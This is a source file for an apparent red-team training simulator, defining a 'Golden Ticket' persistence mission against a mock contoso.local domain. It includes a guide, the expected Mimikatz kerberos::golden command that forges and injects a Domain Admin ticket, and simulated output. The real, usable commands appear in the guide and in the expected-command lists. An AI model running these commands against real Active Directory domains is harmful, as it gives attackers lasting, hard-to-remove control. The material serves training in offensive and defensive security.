/**
 * Mission 6: Golden Ticket (Persistence)
 *
 * This scenario simulates forging a Golden Ticket using a
 * stolen KRBTGT hash for ultimate domain persistence.
 *
 * THIS SCENARIO ASSUMES:
 * 1. The user has compromised the 'krbtgt' NTLM hash from
 * the DCSync (Mission 5) scenario.
 */

export const goldenTicketScenario = {
  id: 'golden-ticket',
  title: 'Golden Ticket: Ultimate Persistence',
  description: 'Forge a Kerberos Golden Ticket using the krbtgt hash to gain persistent, god-mode access.',
  difficulty: 'Advanced',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**The Golden Ticket** is the ultimate persistence mechanism in Active Directory. By forging a Kerberos Ticket Granting Ticket (TGT) using the domain's 'krbtgt' hash, you can become *any user* with *any privilege* for up to 10 years.

**Attack Flow:**
1.  Use the 'krbtgt' hash (from your "Files" tab) and the domain SID to forge a ticket with Mimikatz.
2.  We will forge a ticket for a *non-existent user* named 'BackdoorAdmin' and give it Domain Admin rights.
3.  Inject the forged ticket into your session using Pass-the-Ticket (PTT).
4.  Verify your new, god-like access.

**Why This Matters:**
This attack is devastating. The ticket is 100% valid. The user doesn't exist in AD, so they can't be disabled. The password doesn't matter. The only way to stop this is for the Blue Team to reset the 'krbtgt' password *twice* (a disruptive event).`,
    steps: [
      {
        number: 1,
        title: 'Forge Golden Ticket',
        description:
          'Use Mimikatz to forge the ticket. You will need the "krbtgt" hash from your "Files" tab. We will also need the Domain SID (S-1-5-21-123456-7890-12345).',
        command: 'mimikatz.exe "kerberos::golden /user:BackdoorAdmin /domain:contoso.local /sid:S-1-5-21-123456-7890-12345 /krbtgt:[HASH-FROM-FILES-TAB] /ptt"',
        tip:
          '/ptt stands for Pass-the-Ticket. It injects the ticket into your current session immediately.'
      },
      {
        number: 2,
        title: 'Verify Injected Ticket',
        description:
          'The ticket is now in your local session. Run "klist" to see your new, forged TGT. Notice the user is "BackdoorAdmin".',
        command:
          'klist',
        tip: 'Look at the "Start Time" and "End Time" for the ticket. It\'s valid for 10 years!'
      },
      {
        number: 3,
        title: 'Prove Domain Admin Access',
        description:
          'Even though "BackdoorAdmin" doesn\'t exist, you are now a Domain Admin. Prove it by accessing the C$ admin share on the Domain Controller.',
        command: 'dir \\\\DC01.contoso.local\\C$',
        tip: 'This is the same command that would have failed for any normal user. You now have full control.'
      },
      {
        number: 4,
        title: 'Campaign Complete',
        description:
          'You have achieved total, persistent compromise of the "contoso.local" domain. The Blue Team cannot remove your access without resetting the entire domain\'s "master key".',
        command: null,
        tip: 'Congratulations. You have completed the attack chain.'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommands: [
        'mimikatz.exe "kerberos::golden /user:BackdoorAdmin /domain:contoso.local /sid:S-1-5-21-123456-7890-12345 /krbtgt:[LOOT:krbtgt] /ptt"',
        'mimikatz "kerberos::golden /user:BackdoorAdmin /domain:contoso.local /sid:S-1-5-21-123456-7890-12345 /krbtgt:[LOOT:krbtgt] /ptt"'
      ],
      commonMistakes: [
        {
          pattern: 'kerberos::golden',
          message: 'You need to wrap the full command in quotes and run it with mimikatz.exe'
        }
      ],
      attackerOutput: [
        'mimikatz # kerberos::golden /user:BackdoorAdmin /domain:contoso.local /sid:S-1-5-21-123456-7890-12345 /krbtgt:ffffffffffffffffffffffffffffffff /ptt',
        'User      : BackdoorAdmin',
        'Domain    : contoso.local (CONTOSO)',
        'SID       : S-1-5-21-123456-7890-12345',
        'User Id   : 500 (Administrator)',
        'Groups    : 513, 512, 520, 518, 519 (Domain Admins, etc.)',
        'Hash      : fffffffffffffffffffffffffffffff0',
        'Ticket    : ... (ticket blob) ...',
        '[+] Golden Ticket successfully submitted for current session!'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (Ticket forged on attacker machine).',
        '[AUDIT] Attacker is now operating with a forged Kerberos ticket.'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: 'klist',
      attackerOutput: [
        '[*] Current Kerberos Tickets (1):',
        '',
        '[#0] Client: BackdoorAdmin @ contoso.local',
        '     Server: krbtgt @ contoso.local',
        '     KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96',
        '     Ticket Flags: 0x40e10000 -> forwardable renewable initial pre_authent',
        '     Start Time: 11/14/2025 21:40:00 (Local)',
        '     End Time:   11/14/2035 21:40:00 (Local)',
        '     Renew Time: 11/21/2025 21:40:00 (Local)'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (local command).'
      ],
      delay: 300
    },
    {
      id: 3,
      expectedCommand: 'dir \\\\DC01.contoso.local\\C$',
      attackerOutput: [
        '[*] Accessing \\\\DC01.contoso.local\\C$ using forged ticket...',
        '[+] Success! Authenticated as "BackdoorAdmin".',
        ' Volume in drive \\\\DC01.contoso.local\\C has no label.',
        ' Volume Serial Number is XXXX-XXXX',
        '',
        ' Directory of \\\\DC01.contoso.local\\C$',
        '',
        '06/22/2025  09:00 AM    <DIR>          PerfLogs',
        '07/18/2025  10:30 AM    <DIR>          Program Files',
        '11/14/2025  05:00 PM    <DIR>          Users',
        '05/10/2025  01:15 PM    <DIR>          Windows',
        '               0 File(s)              0 bytes',
        '               4 Dir(s)   25,000,000,000 bytes free'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5 to DC01 (C$)',
        '[AUTH] Kerberos authentication successful.',
        '[AUTH] User: BackdoorAdmin (S-1-5-21-123456-7890-12345-500)',
        '[AUDIT] "BackdoorAdmin" (non-existent account) accessed C$ share.',
        '[ALERT] CRITICAL: A Golden Ticket attack is in progress!'
      ],
      delay: 200
    },
    {
      id: 4,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] CAMPAIGN COMPLETE',
        '[+] ============================================',
        '[+] Attack: Golden Ticket (Persistence)',
        '[+] Status: Domain Dominance Achieved',
        '[+] ============================================',
        '[*] You have completed the full attack chain.',
        '[*] You have undetectable, persistent access to the domain.',
        '',
        '[+] Congratulations! 🎯'
      ],
      serverOutput: [
        '[INFO] Attacker 10.0.0.5 has full domain control.',
      ],
      delay: 400
    }
  ]
};

export default goldenTicketScenario;